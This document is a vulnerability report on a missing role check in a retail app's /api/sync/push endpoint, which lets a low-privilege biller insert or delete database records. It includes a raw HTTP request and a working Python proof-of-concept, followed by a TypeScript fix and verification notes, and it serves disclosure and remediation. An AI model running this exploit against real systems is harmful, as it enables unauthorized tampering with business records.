# Broken Function Level Authorization in /api/sync/push Allows Arbitrary Database Manipulation

**ID:** vuln-0002
**Severity:** HIGH
**Found:** 2026-11-01 13:02:58 UTC
**Target:** http://host.docker.internal:5173
**Endpoint:** /api/sync/push
**Method:** POST
**CWE:** CWE-862
**CVSS:** 7.1
**Confidence:** High
**Fix Effort:** Low

## Description

The database synchronization push endpoint allows low-privilege counter billers to insert, update, and delete arbitrary records across transactional and master database tables, bypassing application authorization controls.

## Evidence

Sending an arbitrary product insertion payload via `/api/sync/push` with the biller session returns HTTP 200 OK:
```http
POST /api/sync/push HTTP/1.1
Host: host.docker.internal:5173
Cookie: sessionId=8530a358db46e439bdb28bcd756932102764c1e2f6c43c4ebe4b0035da6f7ff0
Content-Type: application/json

{"items":[{"id":"e95205e4-1111-2222-3333-444455556666","tableName":"products","rowId":"e95205e4-1111-2222-3333-444455556666","operation":"insert","payload":{"id":"e95205e4-1111-2222-3333-444455556666","storeId":"1de49da7-fbb5-402f-8d55-1c696b0472c9","name":"Biller Injected Product","category":"General","gstRate":"12","sellingRate":"100","mrp":"120","active":true}}]}

HTTP/1.1 200 OK
Content-Type: application/json

{"results":[{"id":"e95205e4-1111-2222-3333-444455556666","status":"ok"}]}
```
Subsequent query to `GET /api/products/e95205e4-1111-2222-3333-444455556666` confirmed the product was successfully inserted into the database. A delete operation was also executed and verified.

## Impact

A counter biller, restricted from editing products, supplier balances, batches, or deleting transactions through standard UI and API routes, can craft arbitrary sync events via `/api/sync/push` to insert, overwrite, or delete master products, batches, stock event deltas, customer balances, supplier balances, and purchase orders directly in the database.

## Counterevidence

Checked if any gateway or hook limits access to /api/sync/push. Confirmed that hooks.server.ts permits any authenticated user. Examined POST /api/sync/push and confirmed it only requires locals.user without role validation. Tested dynamically by injecting and deleting a product record using the biller session cookie, and confirmed direct database modification.

## What Would Change This Severity

If the endpoint was unauthenticated, severity would increase to High/Critical; since authentication as a valid user is required, severity is High.

## Technical Analysis

In `src/routes/api/sync/push/+server.ts`:
The endpoint is intended for store server to cloud synchronization. However, it only requires `if (!locals.user) { return json({ error: 'Unauthorized' }, { status: 401 }); }` without verifying user roles.
Any authenticated user (such as a counter biller) can send raw sync entries affecting:
- `products`
- `product_units`
- `batches`
- `batch_stock_events`
- `suppliers`
- `customers`
- `purchases`
- `purchase_items`
- `sales`
- `sale_items`
- `payments`
- `returns`
- `return_items`

The handler executes a direct database transaction applying `insert`, `update`, or `delete` on the corresponding table or applying stock adjustments to `batchesTable`. This allows complete bypass of application-level business constraints and role authorization.

## Proof of Concept

1. Log in as a low-privilege counter biller (`role: biller`) to obtain a valid session cookie.
2. Send a `POST` request to `/api/sync/push` with a crafted `SyncOutboxEntry` inserting a new product or modifying an existing batch.
3. Observe that the server returns HTTP 200 OK with `status: "ok"`.
4. Verify by querying `GET /api/products/<injected_id>` that the product was directly inserted into the store database.
5. Send a `POST` request to `/api/sync/push` with operation `'delete'` to verify deletion.

```python
import requests
import uuid

BASE_URL = "http://host.docker.internal:5173"

session = requests.Session()
login_res = session.post(
    f"{BASE_URL}/login",
    data={"username": "biller", "password": "biller123"}
)
assert login_res.status_code == 200

# 1. Generate unique row ID
injected_id = str(uuid.uuid4())

# 2. Push insert payload
sync_payload = {
    "items": [{
        "id": injected_id,
        "tableName": "products",
        "rowId": injected_id,
        "operation": "insert",
        "payload": {
            "id": injected_id,
            "name": "PoC Unauthorized Injected Product",
            "category": "General",
            "gstRate": "12",
            "sellingRate": "100",
            "mrp": "120",
            "active": True
        }
    }]
}

push_res = session.post(
    f"{BASE_URL}/api/sync/push",
    json=sync_payload
)
print("Push response:", push_res.status_code, push_res.json())
assert push_res.status_code == 200
assert push_res.json()["results"][0]["status"] == "ok"

# 3. Verify object exists
get_res = session.get(f"{BASE_URL}/api/products/{injected_id}")
print("Get product response:", get_res.status_code, get_res.json())
assert get_res.status_code == 200
assert get_res.json()["data"]["name"] == "PoC Unauthorized Injected Product"
print("Vulnerability confirmed: low-privilege biller manipulated database via sync push!")
```

## Code Analysis

**Location 1:** `src/routes/api/sync/push/+server.ts` (lines 24-28)
  Enforce owner_admin role check on sync push endpoint
  ```
  export const POST: RequestHandler = async ({ request, locals }) => {
  	if (!locals.user) {
  		return json({ error: 'Unauthorized' }, { status: 401 });
  	}
  
  	const body = await request.json();
  ```

  **Suggested Fix:**
```diff
- export const POST: RequestHandler = async ({ request, locals }) => {
- 	if (!locals.user) {
- 		return json({ error: 'Unauthorized' }, { status: 401 });
- 	}
- 
- 	const body = await request.json();
+ export const POST: RequestHandler = async ({ request, locals }) => {
+ 	if (!locals.user) {
+ 		return json({ error: 'Unauthorized' }, { status: 401 });
+ 	}
+ 
+ 	if (locals.user.role !== 'owner_admin') {
+ 		return json({ error: 'Forbidden: Admin role required for database sync operations' }, { status: 403 });
+ 	}
+ 
+ 	const body = await request.json();
```

## Remediation

Restrict `POST /api/sync/push` to `owner_admin` or a dedicated system sync token:
```typescript
if (locals.user.role !== 'owner_admin') {
    return json({ error: 'Forbidden: Admin role required' }, { status: 403 });
}
```

## Fix Verification

Gate 1 (Applicability): Verified line numbers 24-28 in src/routes/api/sync/push/+server.ts match verbatim.
Gate 2 (Security closure): With the check added, requests from biller receive HTTP 403 Forbidden before any database transaction is initiated.
Gate 3 (Bypass review): All operation types (insert, update, delete) across all tableMap entities are protected by this single entrypoint gate.
Gate 4 (Preserved behavior): Store server synchronization processes running with administrator credentials or appropriate sync credentials can still push sync events.
Gate 5 (Repository checks): Syntactically valid TypeScript matching SvelteKit RequestHandler convention.

## Assumptions

Assumes an authenticated attacker with low-privilege 'biller' credentials.
